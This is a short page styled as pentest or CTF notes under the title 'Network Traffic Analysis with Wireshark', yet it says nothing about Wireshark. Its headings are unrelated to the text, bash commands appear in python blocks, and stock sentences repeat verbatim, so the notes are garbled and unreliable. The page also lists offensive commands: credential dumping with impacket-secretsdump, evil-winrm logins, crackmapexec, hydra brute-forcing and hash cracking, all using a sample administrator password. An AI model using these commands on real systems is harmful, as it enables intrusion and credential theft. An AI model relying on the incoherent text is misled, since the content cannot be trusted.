---
TitleSEO: "Network Traffic Analysis with Wireshark | ZureFX"
TitlePost: "Network Traffic Analysis with Wireshark"
Author: "ZureFX"
Description: "Personal notes on Network Traffic Analysis with Wireshark. Quick reference for pentesting and CTF challenges."
Keywords: "oscp, enumeration, malware, networking, lateral movement"
URL: "https://zurefx.github.io/notes/note-network-traffic-analysis-with-wireshark-848.html"
URL_IMAGES: ""
Date: "2025-04-23"
Tags: "OSCP, Enumeration, Malware, Networking, Lateral Movement"
Section: "notes"
Lang: "en"
main_img: "note-network-traffic-analysis-with-wireshark-848"
Permalink: "/notes/note-network-traffic-analysis-with-wireshark-848.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Django

### metasploit

```bash
evil-winrm -i 10.69.165.60 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p995,3268,143 10.110.237.206 -oN scan.txt
gobuster dir -u http://10.46.25.15/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```python
gobuster dir -u http://10.12.234.159/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Authentication bypass was achieved through careful manipulation of the login mechanism.

## john

### ACL Abuse

The service was running without proper input validation, leading to injection vulnerabilities. The service was running without proper input validation, leading to injection vulnerabilities. Authentication bypass was achieved through careful manipulation of the login mechanism. Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality.

```bash
nmap -sCV -p464,389,587 10.50.161.202 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.24.43.232
```

```bash
crackmapexec smb 10.111.239.36 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.80.252.230
impacket-secretsdump administrator:'P@ssw0rd!'@10.128.42.54
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.115.71.128 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p3306,8080,23 10.34.242.8 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.57.99.92/FUZZ
evil-winrm -i 10.120.169.156 -u administrator -p 'P@ssw0rd!'
```

The backup files contained sensitive information that should not have been accessible. The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code. The scheduled task ran with elevated privileges and could be abused for escalation. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Resource-Based Constrained Delegation

### Kali Linux

```python
crackmapexec smb 10.121.146.111 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
feroxbuster -h
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The scheduled task ran with elevated privileges and could be abused for escalation. The application stored sensitive credentials in an unencrypted configuration file. The service was running without proper input validation, leading to injection vulnerabilities.

Lateral movement was facilitated by reusing discovered credentials across services. Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine. The web application was vulnerable to Server-Side Template Injection (SSTI). Group Policy Preferences contained encrypted but recoverable credentials.

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.93.76.241/FUZZ
crackmapexec smb 10.88.64.6 -u administrator -p 'P@ssw0rd!' --shares
```
